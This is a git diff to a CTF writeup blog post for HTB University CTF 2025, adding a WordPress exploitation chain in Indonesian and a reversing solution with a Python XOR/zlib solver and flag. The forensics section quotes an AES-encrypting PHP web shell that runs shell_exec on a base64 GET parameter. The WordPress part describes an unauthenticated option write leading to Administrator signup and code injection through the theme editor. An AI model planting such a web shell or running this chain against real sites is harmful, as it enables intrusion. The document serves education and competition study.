@@ -1,8 +1,8 @@
 ---
-title: University CTF 2025
+title: HTB University CTF 2025
 date: 2025-12-22
 category: CTF
-tags: [Blogs, Writeup, CTF, Forensic, Web]
+tags: [Blogs, Writeup, CTF, Forensic, Web, Reversing]
 description: "Writeup for University CTF 2025 by K4lameety."
 ---
 
@@ -116,14 +116,13 @@ Hello, In this writeup, I will discuss solutions for 3 challenges that I success
 ![After Decrypt](./assets/img/2025-12-22-university-ctf-2025/forensic-8.png)
 
 **Key Code Line:**
-```<?php 
+```
 $A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"; // ← Key AES
 $A4gVaRmV = "pZ7qR1tLw8Df3XbK"; // ← IV AES
 $A4gVaXzY = base64_decode($_GET["q"]);
 $a54vag = shell_exec($A4gVaXzY); // ← This stores command output
 $A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV); // ← AES encryption usage
 echo base64_encode($A4gVaQdF); 
-?>
 ```
 
 **Answer:** `$a54vag`
@@ -190,7 +189,37 @@ echo base64_encode($A4gVaQdF);
 
 **How to bypass the corrupted code and trigger a mass resent of the latest article?**
 
-#### Solution
+#### Solusi
+
+##### Pengintaian (Reconnaissance)
+
+Setelah mengaudit target, saya menemukan instance WordPress yang menjalankan tema khusus dan plugin khusus. Kode sumber plugin mengungkapkan dua cacat utama:
+
+1. **Hook Auto-login:** Pengguna baru secara otomatis masuk menggunakan alur `user_register` → `wp_set_auth_cookie`.
+
+2. **Penulisan Opsi Tanpa Autentikasi:** Fungsi `init()` memeriksa `?settings` dan memanggil `admin_page()` tanpa pemeriksaan autentikasi apa pun. Ini memungkinkan memanggil `update_option()` melalui parameter POST.
+
+##### Rantai Eksploitasi
+
+**1. Penulisan Opsi Tanpa Autentikasi**
+
+Saya menyalahgunakan `admin_page()` yang rentan melalui `wp-admin/admin-ajax.php?settings=1`. Dengan mengirim permintaan POST, saya berhasil mengaktifkan registrasi terbuka dan menetapkan peran default ke Administrator.
+
+**2. Eskalasi Privilese**
+
+Setelah mengaktifkan registrasi, saya menavigasi ke `/wp-login.php?action=register` dan membuat akun baru. Karena hook auto-login plugin, saya diberi privilese Administrator secara instan.
+
+**3. Eksekusi Kode melalui Editor Tema**
+
+Setelah saya memiliki akses Administrator, saya menavigasi ke Appearance → Theme File Editor. Saya memilih file `functions.php` dari tema yang aktif dan menyuntikkan payload khusus untuk membaca flag.
+
+**4. Pengambilan Flag**
+
+Akhirnya, setelah memperbarui file, saya memicu payload dengan mengunjungi halaman beranda dengan parameter spesifik yang saya tentukan:
+
+```
+URL: http://<TARGET_IP>:<PORT>/?readflag=1
+```
 
 ---
 
@@ -209,6 +238,72 @@ echo base64_encode($A4gVaQdF);
 **What is the hidden memory/flag inside the .tflite file after reversing the XOR?**
 
 #### Solution
+
+##### Step 1: Open Model with Netron
+
+**Approach:** Analyze .tflite model architecture using Netron.
+
+**Steps:**
+1. Open snownet_stronger.tflite file in Netron
+2. Model looks odd - only 2 simple paths, not a complex neural network
+3. Found 2 suspicious "Const" tensors:
+   - Tensor 1x4 (likely key/short string)
+   - Tensor 9x1 (likely encrypted payload)
+
+![Image](./assets/img/2025-12-22-university-ctf-2025/rev-1.png)
+
+##### Step 2: Extract Raw Bytes from Tensor
+
+**Approach:** Recover actual byte values (Type Confusion issue).
+
+**Steps:**
+1. TFLite viewer shows values as tiny floating-point numbers (e.g., 5.877e-39)
+2. But actual data is bytes, not float
+3. Use `.tobytes()` to extract raw data:
+
+**Results:**
+- Tensor 1x4: `k3y!`
+- Tensor 9x1: Hex payload starting with `13af8a29...`
+
+![Image](./assets/img/2025-12-22-university-ctf-2025/rev-2.png)
+
+##### Step 3: XOR Decryption
+
+**Approach:** Decrypt payload using key k3y! with simple XOR.
+
+**Steps:**
+1. Take encrypted hex: `13af8a291a990fef5a1b3488e7444f0959bd76134500570b5d7dd0246b5e5b29e3000000`
+2. XOR each byte with key `k3y!` (cycling)
+3. Result: `789cf308...` (Zlib magic bytes)
+
+##### Step 4: Zlib Decompress
+
+**Approach:** Decompress XOR result using zlib.
+
+**Steps:**
+1. Recognized magic bytes `78 9c` = Zlib signature
+2. Use `zlib.decompress()` to inflate
+3. Get final flag
+
+**Quick Solver:**
+```python
+import zlib
+
+encrypted_hex = "13af8a291a990fef5a1b3488e7444f0959bd76134500570b5d7dd0246b5e5b29e3000000"
+cipher_data = bytes.fromhex(encrypted_hex)
+key = b"k3y!"
+
+# XOR decrypt
+decrypted_data = bytes([cipher_data[i] ^ key[i % len(key)] for i in range(len(cipher_data))])
+
+# Decompress
+flag = zlib.decompress(decrypted_data)
+print(flag.decode())
+```
+
+![Image](./assets/img/2025-12-22-university-ctf-2025/rev-3.png)
+
+**Answer:** `HTB{Cl0udy_C0r3_R3v3rs3d}`
 
 ---
 
